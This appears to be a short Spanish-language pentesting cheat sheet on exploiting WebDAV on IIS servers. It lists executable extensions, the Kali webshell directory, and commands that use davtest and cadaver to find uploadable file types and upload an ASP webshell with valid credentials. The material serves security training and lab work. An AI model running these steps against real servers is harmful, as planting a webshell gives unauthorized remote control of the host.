# Explotación de WebDAV en IIS

Tags: #IIS #WebDav 

* IIS = Internet Information Services
	* Soporta extensiones de archivos ejecutables:
		* .asp
		* .aspx
		* .config
		* .php

Necesitamos credenciales validas para poder entrar al WebDav en la web
```bash 
❯ http://IP/webdav/
```

## Webshell 

```bash 
/usr/share/webshells/                # Ruta de la Webshell

	# asp, aspx, cfm, jsp, laudanum, perl, php, seclists
```

## Tools 

```bash 
* davtest           # Usada para escanear, autenticar y explotar un WebDAV
* cadaver           # Soporta la subida y bajada de archivos, visualizacion, editar, mover/copiar, borrar, manipular y bloqueo.
```

Esta tool crea un directorio en el servidor y va subiendo archivos con diferentes extensiones además de ver cuales se pueden ejecutar. 
```bash 
❯ davtest -auth <user>:<passwd> -url http://IP/webdav    # Necesitamos credenciales validas, y nos checara que tipo de archivos puedes subir o ejecutar en el servidor 
```

```bash 
❯ cadaver http://IP/webdav           # Puedes acceder al contenido del servidor WebDAB, te preguntara las credenciales, esta tool te desplegara una consola
	❯ put /usr/share/webshells/asp/webshell.asp      # Asi subimos un archivo al servidor Webdav
```